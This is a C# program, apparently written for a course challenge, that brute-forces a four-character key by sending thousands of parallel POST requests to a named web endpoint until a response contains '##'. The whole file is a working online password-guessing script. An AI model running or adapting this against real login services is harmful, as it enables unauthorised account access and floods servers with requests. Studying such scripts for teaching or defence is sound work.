using System.Text;
using System.Text.Json;

class Program
{
    static readonly HttpClient client = new HttpClient();
    const string url = "https://fiapnet.azurewebsites.net/fiap";
    const string grupo = "GrupoPosTech01-6NETT"; 

    static async Task Main(string[] args)
    {
        IEnumerable<string> passwords = GeneratePasswords();

        var tasks = new List<Task>();

        Parallel.ForEach(passwords, (password) =>
        {
            tasks.Add(TryPasswordAsync(password));
        });

        await Task.WhenAll(tasks);
    }

    static async Task TryPasswordAsync(string password)
    {
        Console.WriteLine($"senha: {password}");
        string response = await PostPasswordAsync(password);
        Console.WriteLine($"Resposta: {response}");

        if (response.Contains("##"))
        {
            Console.WriteLine($"Senha certa: {password}");
            Console.ReadKey();
            Environment.Exit(0); 
        }
    }

    static IEnumerable<string> GeneratePasswords()
    {
        string lettersMaius = "ABCDEFGHIJKLMNOPQRSTUVWXYZY";
        string lettersMinus = "lmnopqrstuvwxyzabcdefghijk";
        string digits = "0123456789";

        foreach (char l1 in lettersMaius)
        {
            foreach (char d1 in digits)
            {
                foreach (char l2 in digits)
                {
                    foreach (char d2 in lettersMinus)
                    {
                        yield return $"{l1}{d1}{l2}{d2}";
                    }
                }
            }
        }
    }
    static async Task<string> PostPasswordAsync(string password)
    {
        var data = new
        {
            Key = password,
            grupo = grupo
        };

        var json = JsonSerializer.Serialize(data);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        try
        {
            var response = await client.PostAsync(url, content);
            response.EnsureSuccessStatusCode();
            return await response.Content.ReadAsStringAsync();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro envio: {ex.Message}");
            return string.Empty;
        }
    }
}
